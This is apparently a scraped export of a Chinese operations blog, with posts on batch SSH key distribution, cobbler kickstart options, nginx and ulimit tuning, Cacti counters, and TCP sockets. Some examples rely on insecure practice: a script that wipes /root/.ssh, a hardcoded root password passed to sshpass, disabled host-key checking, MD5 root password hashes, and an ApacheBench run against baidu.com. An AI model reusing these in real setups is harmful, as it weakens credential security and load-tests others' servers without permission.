&#x2F;root&#x2F;.ssh&#x2F;total 8-rw------- 1 root root 600 2017-08-06 15:29 authorized_keys-rw-r--r-- 1 root root 393 2017-08-05 11:03 known_hosts注：根据man ssh-copy-id命令手册可以了解到，公钥id_dsa.pub传输到远端后，名称自动变成了authorized_keys 客户端连接测试 123456789#客户端连接-测试[root@web01 ~]# ssh 172.16.1.31[root@web01 ~]# ssh 172.16.1.31 &quot;free -m&quot; #不登陆远程主机直接指向命令，输出信息Enter passphrase for key &#39;&#x2F;root&#x2F;.ssh&#x2F;id_dsa&#39;: #出现这个提示说明已经使用了密钥登陆例：[root@web01 ~]# ssh 172.16.1.41 &quot;uname -a&quot;Enter passphrase for key &#39;&#x2F;root&#x2F;.ssh&#x2F;id_dsa&#39;: Linux backup 2.6.32-696.el6.x86_64 #1 SMP Tue Mar 21 19:29:05 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux 当远端服务器改变了SSH端口，推送公钥方法 1234567891011121314[root@m01 ~]# ssh-copy-id -i ~&#x2F;.ssh&#x2F;id_dsa.pub 172.16.1.31 ssh: connect to host 172.16.1.31 port 22: Connection refused说明：当客户端端口改变时，ssh-copy-id命令默认使用22端口建立远程连接，传输公钥文件解决方法：[root@web01 ~]# ssh-copy-id -i ~&#x2F;.ssh&#x2F;id_dsa.pub &quot;-p52113 172.16.1.31&quot; Enter passphrase for key &#39;&#x2F;root&#x2F;.ssh&#x2F;id_dsa&#39;: Now try logging into the machine, with &quot;ssh &#39;-p52113 172.16.1.31&#39;&quot;, and check in: .ssh&#x2F;authorized_keysto make sure we haven&#39;t added extra keys that you weren&#39;t expecting. 了解ssh-copy-id命令执行过程 123456[root@web01 ~]# vim &#x2F;usr&#x2F;bin&#x2F;ssh-copy-id#选段如下ssh $1 &quot;exec sh -c &#39;cd; umask 077; test -d .ssh || mkdir .ssh ; cat &gt;&gt; .ssh&#x2F;authorized_keys &amp;&amp; (test -x &#x2F;sbin&#x2F;restorecon &amp;&amp; &#x2F;sbin&#x2F;restorecon .ssh .ssh&#x2F;authorized_keys &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 || true)&#39;&quot; 注：该脚本中嵌入了两个shift指令，$1在此处意思是指&quot;-p52113 172.16.1.31&quot; 1234567891011121314151617181920shell脚本-shift指令用法[root@web01 ~]# vim test_shift.sh#!&#x2F;bin&#x2F;bashuntil [ $# -eq 0 ]do echo $* shiftdone[root@web01 ~]# sh test_shift.sh 1 2 3 4 51 2 3 4 52 3 4 53 4 54 55我们可以看到，每执行一次shift命令，就将脚本传参的参数向前推移一位，所以这就可以理解了为什么步骤4中“-p52113 172.16.1.31&quot;这一部分变成了 传参$1 批量分发公钥-脚本-实现免密登陆 12345678910111213141516需要解决的问题:# 01. 创建秘钥对时需要进行交互ssh-keygen -t dsa -f &#x2F;root&#x2F;.ssh&#x2F;id_dsa -P &quot;123&quot; &amp;&gt;&#x2F;dev&#x2F;null#注：-t dsa 指定密钥类型-f 事先指定密钥文件-P 定义密钥密码&amp;&gt;&#x2F;dev&#x2F;null 将其定向到空，即不输出密钥创建成功信息。################################################# 02. 分发公钥时是需要输入yes&#x2F;no# 03. 分发公钥时需要输入密码信息yum install -y sshpasssshpass -p123456 ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub &quot;-o StrictHostKeyChecking&#x3D;no root@172.16.1.31&quot;-o StrictHostKeyChecking&#x3D;no 不进行交互提示，注意使用双引号括起来 123456789#!&#x2F;bin&#x2F;bashrm -f &#x2F;root&#x2F;.ssh&#x2F;*ssh-keygen -t dsa -f &#x2F;root&#x2F;.ssh&#x2F;id_dsa -P &quot;&quot; &amp;&gt;&#x2F;dev&#x2F;nullfor ip in 31 41 do sshpass -p123456 ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub &quot;-o StrictHostKeyChecking&#x3D;no root@172.16.1.$ip&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 echo &quot;172.16.1.$ip &#x3D; OK&quot; done 12345678910执行脚本并测试免密登陆：[root@web01 ~]# sh piliang.sh 172.16.1.31 &#x3D; OK172.16.1.41 &#x3D; OK[root@web01 ~]# ssh 172.16.1.31Last login: Sun Aug 6 16:57:31 2017 from 192.168.56.1[root@nfs01 ~]# [root@nfs01 ~]# logoutConnection to 172.16.1.31 closed.","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"dsa","slug":"dsa","permalink":"https://garywu520.github.io/tags/dsa/"},{"name":"密钥","slug":"密钥","permalink":"https://garywu520.github.io/tags/%E5%AF%86%E9%92%A5/"},{"name":"认证","slug":"认证","permalink":"https://garywu520.github.io/tags/%E8%AE%A4%E8%AF%81/"},{"name":"免密登陆","slug":"免密登陆","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86/"}]},{"title":"cobbler ks参数-详解","slug":"cobbler-ks参数-详解","date":"2017-09-01T06:17:21.000Z","updated":"2017-09-01T10:50:08.922Z","comments":true,"path":"2017/09/01/cobbler-ks参数-详解/","link":"","permalink":"https://garywu520.github.io/2017/09/01/cobbler-ks%E5%8F%82%E6%95%B0-%E8%AF%A6%E8%A7%A3/","excerpt":"kickstart文件结构介绍： 123451) 命令部分：配置系统的属性及安装中的各种必要设置信息2) %packages部分：设定需要安装的软件包及包组，Anaconda会自动解决依赖关系3) 脚本部分：用于定制系统，分为%pre部分在安装前运行，%post在安装后运行 %pre 部分脚本作为一个bash shell脚本执行，在Kickstart文件解析后执行； %post 解析器默认为bash，可以自定义，缺省为chroot状态，也可指定非chroot状态；","text":"kickstart文件结构介绍： 123451) 命令部分：配置系统的属性及安装中的各种必要设置信息2) %packages部分：设定需要安装的软件包及包组，Anaconda会自动解决依赖关系3) 脚本部分：用于定制系统，分为%pre部分在安装前运行，%post在安装后运行 %pre 部分脚本作为一个bash shell脚本执行，在Kickstart文件解析后执行； %post 解析器默认为bash，可以自定义，缺省为chroot状态，也可指定非chroot状态； Kickstart文件主要参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199install (可选) 明确指定系统次次进行的是全新安装系统；是默认项；cdrom（可选） 以本地CD-ROM为源安装系统；url (可选) 指定通过FTP或HTTP从网络获取安装树； --url 指定资源位置 例： url --url ftp:&#x2F;&#x2F;&lt;username&gt;:&lt;password&gt;@install.example.com&#x2F;iso url --url http:&#x2F;&#x2F;install.example.com&#x2F;isobootloader（必需） 设定boot loader安装选项； --append&#x3D; 可以指定内核参数 --driveorder&#x3D; 设定设备BIOS中的开机设备启动顺序 --location&#x3D; 设定引导记录的位置； mbr：默认值； partition：将boot loader安装于包含kernel的分区超级快中； none：不安装boot loder。 示例： bootloader --location&#x3D;mbr --append&#x3D;“rhgb quiet” --driveorder&#x3D;sda,sdbclearpart （可选） 在建立新分区前清空系统上原有的分区表，默认不删除分区； --all 擦除系统上原有所有分区； --drives 删除指定驱动器上的分区 --initlabel 初始化磁盘卷标为系统架构的默认卷标 --linux 擦除所有的linux分区 --none（default）不移除任何分区 例： clearpart --drives&#x3D;hda,hdb --all --initlabelzerombr （可选） 清除mbr信息，会同时清空系统用原有分区表 firewall （可选） 配置系统防火墙选项； firewall –enable|--disable [ --trust ] &lt;device&gt; [ --port&#x3D; ] --enable 拒绝外部发起的任何主动连接； --disable 不配置任何iptables防御规则； --trust 指定完全信任网卡设备； --port 使用port:protocol格式指定可以通过防火墙的服务； 示例： firewall --enable --trust eth0 --trust eth1 --port&#x3D;80:tcpselinux （可选） 设置系统selinux状态；默认为启用并处于enforcing模式； selinux [ --disabled|–enforcing|--premissive ]reboot （可选） 在系统成功安装完成后，自动重启系统（默认）； 注：使用cobbler安装系统时，该选项不会导致死循环，因为cobbler默认从local启动。graphical （可选） 默认值，在图形模式下进行kickstart方式安装；---- 不推荐！text （可选） 以文本方式进行kickstart安装；--- 默认为图形界面skipx （可选） 如果该项存在，就不对系统的X(图形组件)进行设置；keyboard （必需） 设置键盘类型；一般设置为us； lang （必需） 设置安装过程使用的语言及系统的缺省语言； 文本模式安装时不支持中文，所以仍以默认的英文方式安装；默认en_us， 装中文时，需要后期%packages部分装上中文支持组件chineses-suppot； 例：lang en_US timezone （可选） 设置系统的时区； timezone [ --utc ] &lt;timezone&gt; 例： timezone --utc Asia&#x2F;Shanghai logging # 设置安装日志输出级别 logging --level&#x3D;info # 第一次启动时不运行设置向导firstboot --disableignoredisk --only-use&#x3D;sdaauth&#x2F;authconfig (必需) 设置系统的认证方式；默认为加密但不隐藏(shadow)； --enablemd5 使用MD5加密方式 --useshadow或—enableshadow 使用隐藏密码； 例： authconfig --enableshadow --passalgo&#x3D;sha512rootpw （必需） 设置系统root账号的密码； rootpw [ --iscrypted ] &lt;passwd&gt; --iscrypted 表示设置的密码为加密过的串； 例： rootpw --iscrypted $1$RPYyxobb$&#x2F;LtxMNLybNuEARg2Vu2s1 ###########################################################注：cobbler ks文件中, rootpw密码生成方法[root@localhost]# perl -e &#39;print crypt(&quot;123&quot;,q($1$password)),&quot;\\n&quot;&#39;$1$password$7KQhqIXUBf.cvy2wwAfzc11. 其中,123为我们要定义的密码，然后将输出后的密文，复制粘贴到rootpw参数里即可。2. 而$1$password字符串是自定义字符串，shadow里一般用“ $1$后面跟8个字符 ” 这种格式，所以就是用了passwd代替。############################################################network （可选） 配置网络信息；在网络安装（NFS&#x2F;HTTP&#x2F;FTP）时必须指定； --bootproto&#x3D;dhcp|bootp|static 指定ip获取方式，默认为dhcp&#x2F;bootp; --device&#x3D; 设置安装时激活来进行系统安装的网卡设备； --ip&#x3D; ip设置 --gateway&#x3D; 网关 --nameserver&#x3D; DNS设置 --nodns 不设置DNS --netmask&#x3D; 掩码 --hostname&#x3D; 设置安装后主机名称 --onboot&#x3D; 设置是否在系统启动时激活网卡 --class&#x3D; 设置DHCP的class值 --noipv4 禁用该设备的ipv4功能 --noipv6 禁用该设备的ipv6功能 如将网络模式设置为静态模式，则必须在一行内写上ip，netmask、dns、gateway等信息； 例： network –bootproto&#x3D;static –ip&#x3D;1.1.1.1 --netmask&#x3D;255.0.0.0 --gateway&#x3D;1.1.1.254 --nameserver&#x3D;1.1.1.2 onboot&#x3D;on --noipv6 services （可选） 设置禁用或允许列出的服务； --disabled 设置服务为禁用 --enabled 启动服务 例： services --disabled autid,cups,smartd,nfslock 服务之间用逗号隔开，不能有空格建立新分区；part &lt;mntpoint&gt;|swap options mntpoint:挂载点，是在创建普通分区时指定新分区挂载位置的项,比如: &#x2F;data&#x2F;A swap： 创建swap分区； --size&#x3D; 设置分区的最小值，默认单位为M，但是不能写单位,也不能指定单位G或T； --grow 让分区自动增长利用可用的磁盘空间，或是增长到设置的maxsize值； --maxsize 设置分区自动增长(grow)时的最大容量值，以M为单位，但不能写单位； --noformat 设置不格式化指定的分区 --onpart&#x3D;&#x2F;dev&#x2F;sdb1 安装在哪个分区上 --asprimary 强制制定该分区为主分区；若指定失败，分区会失败，导致安装停止； --fstype&#x3D; 新增普通分区时指定分区的类型，可以为ext2、ext3、ext4、swap、vfat及hfs； --ondisk&#x3D;&#x2F;--ondrive&#x3D; 设定该分区创建在一个具体的磁盘上,如：--ondisk&#x3D;&#x2F;dev&#x2F;sda --start 指定分区以磁盘上那个磁道开始；需要跟--ondisk参数一块使用； --end 指定分区以磁盘上那个磁道结束；需要跟上述两个参数一起使用； --bytes-pre-inode&#x3D; 指定分区格式化时inode的大小；默认值为4096 --fsoptions&#x3D; 指定创建fstab文件时该分区挂载参数项； 例： part &#x2F;boot --fstype&#x3D;“ext3” --size&#x3D;200 part swap --fstype&#x3D;“swap” –size&#x3D;8192 part &#x2F; --bytes-pre-inode&#x3D;4096 --fstype&#x3D;“ext4” --size&#x3D;10000 part &#x2F;data&#x2F;A --onpart&#x3D;&#x2F;dev&#x2F;sdb1 --noformat%packages @base @chinese-supportbind-utilslrzszvim*%end%postsystemctl disable postfix.service%end 最后磁盘分区的问题123456当磁盘大于2TB, cobbler安装CentOS7将会出错，错误如下：Your BIOS-based system needs a special partition to boot from a GPT disk label. To continue, please create a 1MB &#39;biosboot&#39; type partition.解决方法：在ks文件中添加如下：part biosboot --fstype&#x3D;biosboot --size&#x3D;1","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"自动化","slug":"自动化","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"cobbler","slug":"cobbler","permalink":"https://garywu520.github.io/tags/cobbler/"},{"name":"kickstart","slug":"kickstart","permalink":"https://garywu520.github.io/tags/kickstart/"},{"name":"ks","slug":"ks","permalink":"https://garywu520.github.io/tags/ks/"},{"name":"系统批量安装","slug":"系统批量安装","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%89%B9%E9%87%8F%E5%AE%89%E8%A3%85/"}]},{"title":"nginx优化","slug":"nginx优化","date":"2017-08-31T12:30:44.000Z","updated":"2017-08-31T13:12:19.515Z","comments":true,"path":"2017/08/31/nginx优化/","link":"","permalink":"https://garywu520.github.io/2017/08/31/nginx%E4%BC%98%E5%8C%96/","excerpt":"本文提到的Nginx配置，需要较高版本Linux内核才支持。在实际生产环境中，升级服务器内核不是一件容易事儿，但为了更好的性能，有些升级还是必须的。","text":"本文提到的Nginx配置，需要较高版本Linux内核才支持。在实际生产环境中，升级服务器内核不是一件容易事儿，但为了更好的性能，有些升级还是必须的。 TCP优化12345678http &#123; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 60; ... ...&#125; 12345678910111213141) sendfile: 配置可以提高Nginx静态资源托管效率。Sendfile是一个系统调用，直接在内核空间完成文件发送，不需要事先read再write,没有上下文切换的开销。 2) tcp_nopush TCP_NOPUSH 是 FreeBSD 的一个 socket 选项，对应 Linux 的 TCP_CORK，Nginx 里统一用 tcp_nopush 来控制它，并且只有在启用了 sendfile 之后才生效。启用它之后，数据包会累计到一定大小之后才会发送，减小了额外开销，提高网络效率。3) tcp_nodelay 也是一个 socket 选项，启用后会禁用 Nagle 算法，尽快发送数据，某些情况下可以节约 200ms（Naggle 算法原理是：在发出去的数据还未被确认之前，新生成的小数据先存起来，凑满一个 MSS 或者等到收到确认后再发送）。Nginx只会针对处于keep-alive状态的TCP连接才会启用 tcp_nodelay. 4) keepalive_timeout 用来指定服务端为每个 TCP 连接最多可以保持多长时间。Nginx 的默认值是 75 秒，有些浏览器最多只保持 60 秒，所以我统一设置为 60。可以看到tcp_nopush是要等数据包累积到一定大小才发送，而tcp_nodelay是要尽快发送，二者相互矛盾。实际上，它们确实可以一起用，最终的效果是先填满包，再尽快发送。 1另外，还有一个 TCP 优化策略叫 TCP Fast Open（TFO），TFO 的作用是用来优化 TCP 握手过程。客户端第一次建立连接还是要走三次握手，所不同的是客户端在第一个 SYN 会设置一个 Fast Open 标识，服务端会生成 Fast Open Cookie 并放在 SYN-ACK 里，然后客户端就可以把这个 Cookie 存起来供之后的 SYN 用。下面这个图形象地描述了这个过程： 需要注意的是，现阶段只有 Linux、ChromeOS 和 Android 5.0 的 Chrome / Chromium 才支持 TFO，所以实际用途并不大。 123Nginx 1.9.1增加了 reuseport 功能，意味着 Nginx 也开始支持 TCP 的 SO_REUSEPORT 选项了。启用这个功能后，Nginx 会在指定的端口上监听多个 socket，每个 Worker 都能分到一个。请求过来时，系统内核会自动通过不同的 socket 分配给对应的 Worker，相比之前的单 socket 多 Worker 的模式，提高了分发效率。下面这个图形象地描述了这个过程： Socket优化123456789101112131415由TCP头部结构可以了解到，源端口到目的端口范围是0-31，源端口16位，目的端口也是16位。换算一下，端口范围是 2^16&#x3D;65536, 那为什么都说最大是65535呢？ 因为端口是从0开始算起的，也就是0-65535，但是0属于保留端口，这么说就明白了是吧？ 也就是说一台服务器最多支持这么多socket连接。但是系统默认就支持这么多连接吗？No, 回到linux系统本质，“一切皆文件”，一个连接属于一个socket，一个socket也算是一个文件，但是系统支持打开这么多文件吗？那就聊聊ulimit ,如何查看和优化#查看ulimit【open files字段】ulimit -a #优化Linux系统的最大进程数和最大文件打开数vi &#x2F;etc&#x2F;security&#x2F;limits.conf # 添加如下的行 * soft noproc 11000 * hard noproc 11000 * soft nofile 8192 * hard nofile 8192 说明：* 代表针对所有用户，noproc 是代表最大进程数，nofile 是代表最大文件打开数","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"http","slug":"http","permalink":"https://garywu520.github.io/tags/http/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"TCP","slug":"TCP","permalink":"https://garywu520.github.io/tags/TCP/"},{"name":"socket","slug":"socket","permalink":"https://garywu520.github.io/tags/socket/"},{"name":"优化","slug":"优化","permalink":"https://garywu520.github.io/tags/%E4%BC%98%E5%8C%96/"},{"name":"ulimit","slug":"ulimit","permalink":"https://garywu520.github.io/tags/ulimit/"},{"name":"tcp_nopush","slug":"tcp-nopush","permalink":"https://garywu520.github.io/tags/tcp-nopush/"},{"name":"tcp_nodelay","slug":"tcp-nodelay","permalink":"https://garywu520.github.io/tags/tcp-nodelay/"}]},{"title":"Cacti网卡流量达到100M后-流量图不准问题","slug":"Cacti网卡流量达到100M后-流量图不准问题","date":"2017-08-30T06:16:53.000Z","updated":"2017-08-30T06:57:22.413Z","comments":true,"path":"2017/08/30/Cacti网卡流量达到100M后-流量图不准问题/","link":"","permalink":"https://garywu520.github.io/2017/08/30/Cacti%E7%BD%91%E5%8D%A1%E6%B5%81%E9%87%8F%E8%BE%BE%E5%88%B0100M%E5%90%8E-%E6%B5%81%E9%87%8F%E5%9B%BE%E4%B8%8D%E5%87%86%E9%97%AE%E9%A2%98/","excerpt":"因业务需要，某台机器流量上升到了100M，但是经过排查流量图显示有误，不准确。","text":"因业务需要，某台机器流量上升到了100M，但是经过排查流量图显示有误，不准确。 Google后发现问题原因在于网卡监控参数配置不正确，当流量超过100M后，导致图会出现频繁“跳水” 解决方案： 1231）删除之前的监控图以及对应图形树2) 【重新添加】在Cacti管理页面中选择Console-&gt;Data Source, 找到需要修改的机器和对应端口（即流量大于100M的端口），修改Output Type ID为In&#x2F;Out bits (64-bit counters)（原来为In&#x2F;Out bits），修改Maximum Value 为 1000000000 注：如果监控图出现了多个eth0网卡监控图，需要删除此主机，然后按照上面方法重新添加","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cacti","slug":"cacti","permalink":"https://garywu520.github.io/tags/cacti/"},{"name":"100M","slug":"100M","permalink":"https://garywu520.github.io/tags/100M/"},{"name":"流量不准","slug":"流量不准","permalink":"https://garywu520.github.io/tags/%E6%B5%81%E9%87%8F%E4%B8%8D%E5%87%86/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"监控","slug":"监控","permalink":"https://garywu520.github.io/tags/%E7%9B%91%E6%8E%A7/"}]},{"title":"深入理解TCP Socket","slug":"深入理解TCP-Socket","date":"2017-08-28T11:04:07.000Z","updated":"2017-08-28T11:18:35.622Z","comments":true,"path":"2017/08/28/深入理解TCP-Socket/","link":"","permalink":"https://garywu520.github.io/2017/08/28/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP-Socket/","excerpt":"什么是Socket ？ 大家都用电脑上网，当我们访问运维社区https://www.unixhot.com的时候，我们的电脑和运维社区的服务器就会创建一条Socket，我们称之为网络套接字。那么既然是网络通信，肯定是成对的。至少有一个客户端和服务端，我们称之为套接字对。","text":"什么是Socket ？ 大家都用电脑上网，当我们访问运维社区https://www.unixhot.com的时候，我们的电脑和运维社区的服务器就会创建一条Socket，我们称之为网络套接字。那么既然是网络通信，肯定是成对的。至少有一个客户端和服务端，我们称之为套接字对。 一个套接字对（socket pair）是一个定义该网络连接的两个端点的五元组，包括： 123451. 源IP地址2. 源端口3. 目的IP地址4. 目的端口5. 类型：TCP or UDP 那么针对于HTTP请求来说，我们知道底层是建立了一条TCP的Socket，那么TCP的套接字对就是一个四元组，因为协议已经确定了： 1.源IP地址、2.源端口、3.目的IP地址、4.目的端口。 客户机的随机端口 123当客户端192.168.56.11访问192.168.56.12的9999端口的时候，那么会选择一个随机端口来进行通信，那么这个随机端口，到底是从什么范围随机出来了呢，端口总有一个范围不可能无穷多的。 那么对于TCP套接字来说客户端的一个IP地址，到底能有多少个端口呢？由于TCP协议头部使用16位来保存端口号，所以端口的个数最多为65536个，2^16&#x3D;65536。 12345678没错，是65536个。但是为什么我们经常看到网上说可用端口最大65535个呢，也就是2^16-1个。因为端口号是从0开始算的，0-65535那就是65536个。而0端口是保留端口，无论是TCP还是UDP都是不用使用的，当然这个是标准。好的，我们现在知道了端口的范围0-65535，那么作为客户端访问其它服务端的时候，能用多少呢？并不是这个范围都可以用的。那么在Linux下我们可以这么获取本地的随机端口范围：[root@test ~]# cat&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range 32768 61000不要惊讶答案确实是32768到61000，现在你应该明白，别人说的发10万并发进行压力测试代表什么意思了吧。至少默认情况下是无法实现的，读完这句话，是否有启发呢？并不是不能实现哦。 瓶颈真的只有随机端口范围吗？ 1234刚才我们也看了，我们访问其它服务器，作为客户端，我们要使用一个随机端口，32768-61000，貌似也不少，当然你还可以修改它，扩大随机端口范围。例如我们使用Nginx做反向代理负载均衡的时候，用户端和Nginx建立Socket进行通信，Nginx还需要和后端真实服务器也建立Socket进行通信，在高并发的场景下，这个随机端口肯定是一个瓶颈。但是真的只有随机端口范围是瓶颈吗？下面我们使用ab命令来对百度进行一次压力测试。ab是Apache的性能测试工具，可以模拟并发进行Web性能测试。在CenotOS下，你可以这样来安装:[root@test ~]# yuminstall -y httpd-devel 1234567891011121314按照咱们之前的认识，随机端口61000-32768&#x3D;28232，那么我实验的机器是一台刚安装的系统，没有什么网络传输，即便有，我们创建2万个套接字对应该是没问题吧。事实真的如此吗？我们用实验来证明：我们模拟发送2万个请求，2000的并发来测试百度：[root@test ~]#ab -n 10000 -c 2000 https:&#x2F;&#x2F;www.baidu.com&#x2F;This isApacheBench, Version 2.3 &lt;$Revision: 1430300 $&gt;Copyright 1996Adam Twiss, Zeus Technology Ltd, http:&#x2F;&#x2F;www.zeustech.net&#x2F;Licensed to TheApache Software Foundation, http:&#x2F;&#x2F;www.apache.org&#x2F;Benchmarkingwww.baidu.com (be patient)socket: Toomany open files (24)这不可能，为什么报错了？不要担心，报错我们很容易看懂了socket: Too many open files (24),，不能打开太多的文件。我们使用ulimit来看看系统资源限制。 1234567891011121314[root@test ~]# ulimit -acore file size (blocks, -c) 0data seg size (kbytes, -d) unlimitedscheduling priority (-e) 0file size (blocks, -f) unlimitedpending signals (-i) 31219max locked memory (kbytes, -l) 64max memory size (kbytes, -m) unlimitedopen files (-n) 1024(省略部分输出)没错，默认情况下，当前用户能够打开的文件数量最大是1024，但是这个和我们使用ab测试有什么关系呢？ab测试创建的不是socket吗？如果你不理解，那就要回归本质，想想我们刚刚学习Linux的时候，经常听到的一句Linux的思想“一切皆文件”！谁说socket不是一个文件呢？我相信你知道怎么做了，你可以使用ulimit –n来修改当前用户、当前session的限制，也可以修改配置文件&#x2F;etc&#x2F;security&#x2F;limits.conf来彻底解决这个问题，这也是进行系统性能调优的必备基础。 创建一条TCP Socket 好的，刚才只是一个小插曲，我们继续探索TCP Socket，光说不练是个棒槌。我们来创建一个套接字对看看： 服务端： 首先，我们在192.168.56.12上使用nc命令，来监听9999端口。 123[root@192.168.56.12 ~]#nc -l -4 -p 9999 -k [root@192.168.56.12 ~]#netstat -ntlp | grep 9999tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN 26789&#x2F;n 客户端： 在客户端，同样使用nc命令来连接到服务端的9999端口。 1[root@192.168.56.11 ~]#nc 192.168.56.12 9999 好的，现在你可以在客户端上输入任何的语言和服务端愉快的聊天了?不过这不是重点。 查看Socket 我们先来看看客户端的TCPSocket。 12[root@192.168.56.11 ~]#netstat -na | grep 9999tcp 0 0 192.168.56.11:11525 192.168.56.12:9999 ESTABLISHED 服务端的TCP Socket 123[root@192.168.56.12 ~]#netstat -na | grep 9999tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN tcp 0 0 192.168.56.12:9999 192.168.56.11:11525 ESTABLISHED 我相信你已经真正理解了Socket，剩下的就是无尽的想象，还记得TIME_WAIT吗？如果有大量的TIME_WAIT存在，那么这个套接字对是不释放的，不释放也就代表着占用一个，资源嘛，占用一个就少一个。 ​ 不过，如果你真的理解了Socket的概念，你已经有了一个终极解决方案。既然一个TCP Socket是一个四元组，那如果我这台机器有多个IP地址呢？哈哈，这是一句画龙点睛之语，你懂的！ 文章来源：运维社区-赵班长 Web性能优化之-深入理解TCP Socket","categories":[],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://garywu520.github.io/tags/HTTP/"},{"name":"socket","slug":"socket","permalink":"https://garywu520.github.io/tags/socket/"},{"name":"套接字","slug":"套接字","permalink":"https://garywu520.github.io/tags/%E5%A5%97%E6%8E%A5%E5%AD%97/"},{"name":"firebug","slug":"firebug","permalink":"https://garywu520.github.io/tags/firebug/"},{"name":"五元组","slug":"五元组","permalink":"https://garywu520.github.io/tags/%E4%BA%94%E5%85%83%E7%BB%84/"}]},{"title":"OSI7层网络模型","slug":"OSI7层网络模型","date":"2017-08-28T10:12:25.000Z","updated":"2017-08-28T10:59:32.235Z","comments":true,"path":"2017/08/28/OSI7层网络模型/","link":"","permalink":"https://garywu520.github.io/2017/08/28/OSI7%E5%B1%82%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/","excerpt":"OSI（Open System Interconnection，开放系统互连）七层网络模型称为开放式系统互联参考模型 ，是一个逻辑上的定义，一个规范，它把网络从逻辑上分为了7层。","text":"OSI（Open System Interconnection，开放系统互连）七层网络模型称为开放式系统互联参考模型 ，是一个逻辑上的定义，一个规范，它把网络从逻辑上分为了7层。 OSI 7层网络模型 HTTP连接 1234567HTTP协议即超文本传送协议(Hypertext Transfer Protocol )，是Web联网的基础，也是手机联网常用的协议之一，HTTP协议是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为“一次连接”。1）在HTTP 1.0中，客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。2）在HTTP 1.1中则可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。由于HTTP在每次请求结束后都会主动释放连接，因此HTTP连接是一种“短连接”，要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常 的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道 客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。 TCP 12345我们需要知道TCP工作在网络OSI的七层模型中的第四层——Transport层IP在第三层——Network层；ARP在第二层——Data Link层；在第二层上的数据，我们把它叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。 同时，我们需要简单的知道，数据从应用层发下来，会在每一层都会加上头部信息，进行封装，然后再发送到数据接收端。这个基本的流程你需要知道，就是每个数据都会经过数据的封装和解封装的过程。 在OSI七层模型中，每一层的作用和对应的协议如下： TCP头部 12345678910111213上面就是TCP协议头部的格式，由于它太重要了，是理解其它内容的基础，下面就将每个字段的信息都详细的说明一下。Source Port和Destination Port:分别占用16位，表示源端口号和目的端口号；用于区别主机中的不同进程，而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一的确定一个TCP连接；Sequence Number:用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据字节在数据流中的序号；主要用来解决网络报乱序的问题；Acknowledgment Number:32位确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志（下面介绍）为1时该确认序列号的字段才有效。主要用来解决不丢包的问题；Offset:给出首部中32 bit字的数目，需要这个值是因为任选字段的长度是可变的。这个字段占4bit（最多能表示15个32bit的的字，即4*15&#x3D;60个字节的首部长度），因此TCP最多有60字节的首部。然而，没有任选字段，正常的长度是20字节；TCP Flags:TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控TCP的状态机的，依次为URG，ACK，PSH，RST，SYN，FIN。Window:窗口大小，也就是有名的滑动窗口，用来进行流量控制； 每个标志位的意思如下： 